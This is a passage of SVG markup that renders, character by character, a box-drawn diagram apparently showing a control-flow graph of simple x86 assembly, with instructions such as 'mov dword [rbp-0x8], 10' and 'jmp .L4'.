<text text-anchor='middle' x='336' y='484' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='336' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='336' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='100' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='344' y='132' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='344' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='484' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='344' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='344' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='484' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='352' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='352' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='484' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='360' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='360' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='484' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='368' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='368' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='484' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='376' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='376' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='484' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='384' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='384' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='276' fill='currentColor' style='font-size:1em'>┌</text>
<text text-anchor='middle' x='392' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='392' y='356' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='392' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='392' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='484' fill='currentColor' style='font-size:1em'>2</text>
<text text-anchor='middle' x='400' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='400' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='484' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='408' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='408' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='228' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='292' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='416' y='324' fill='currentColor' style='font-size:1em'>j</text>
<text text-anchor='middle' x='416' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='416' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='228' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='424' y='244' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='260' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='424' y='324' fill='currentColor' style='font-size:1em'>m</text>
<text text-anchor='middle' x='424' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='388' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='404' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='420' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='424' y='436' fill='currentColor' style='font-size:1em'>└</text>
<text text-anchor='middle' x='424' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='424' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='292' fill='currentColor' style='font-size:1em'>v</text>
<text text-anchor='middle' x='432' y='324' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='432' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='432' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='440' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='448' y='324' fill='currentColor' style='font-size:1em'>.</text>
<text text-anchor='middle' x='448' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='448' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='292' fill='currentColor' style='font-size:1em'>w</text>
<text text-anchor='middle' x='456' y='324' fill='currentColor' style='font-size:1em'>L</text>
<text text-anchor='middle' x='456' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='456' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='292' fill='currentColor' style='font-size:1em'>o</text>
<text text-anchor='middle' x='464' y='324' fill='currentColor' style='font-size:1em'>4</text>
<text text-anchor='middle' x='464' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='464' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='472' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='472' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='292' fill='currentColor' style='font-size:1em'>d</text>
<text text-anchor='middle' x='480' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='480' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='488' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='292' fill='currentColor' style='font-size:1em'>[</text>
<text text-anchor='middle' x='496' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='468' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='532' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='496' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='292' fill='currentColor' style='font-size:1em'>r</text>
<text text-anchor='middle' x='504' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='468' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='504' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='504' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='504' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='504' y='532' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='504' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='504' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='292' fill='currentColor' style='font-size:1em'>b</text>
<text text-anchor='middle' x='512' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='644' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='512' y='740' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='292' fill='currentColor' style='font-size:1em'>p</text>
<text text-anchor='middle' x='520' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='520' y='644' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='520' y='660' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='520' y='676' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='520' y='692' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='520' y='708' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='520' y='724' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='520' y='740' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='528' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='292' fill='currentColor' style='font-size:1em'>-</text>
<text text-anchor='middle' x='528' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='436' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='528' y='612' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='536' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='536' y='436' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='536' y='452' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='468' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='484' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='500' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='516' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='532' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='548' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='564' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='580' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='596' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='536' y='612' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='544' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='544' y='292' fill='currentColor' style='font-size:1em'>x</text>
<text text-anchor='middle' x='544' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='552' y='292' fill='currentColor' style='font-size:1em'>8</text>
<text text-anchor='middle' x='552' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='560' y='292' fill='currentColor' style='font-size:1em'>]</text>
<text text-anchor='middle' x='560' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='568' y='292' fill='currentColor' style='font-size:1em'>,</text>
<text text-anchor='middle' x='568' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='20' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='180' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='576' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='20' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='584' y='36' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='52' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='68' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='84' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='100' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='116' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='132' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='148' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='164' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='584' y='180' fill='currentColor' style='font-size:1em'>┘</text>
<text text-anchor='middle' x='584' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='584' y='292' fill='currentColor' style='font-size:1em'>1</text>
<text text-anchor='middle' x='584' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='592' y='292' fill='currentColor' style='font-size:1em'>0</text>
<text text-anchor='middle' x='592' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='600' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='608' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='616' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='624' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='632' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='640' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='648' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='656' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='664' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='276' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='672' y='356' fill='currentColor' style='font-size:1em'>─</text>
<text text-anchor='middle' x='680' y='276' fill='currentColor' style='font-size:1em'>┐</text>
<text text-anchor='middle' x='680' y='292' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='680' y='308' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='680' y='324' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='680' y='340' fill='currentColor' style='font-size:1em'>│</text>
<text text-anchor='middle' x='680' y='356' fill='currentColor' style='font-size:1em'>┘</text>
</g>

    </svg>
  
</div>
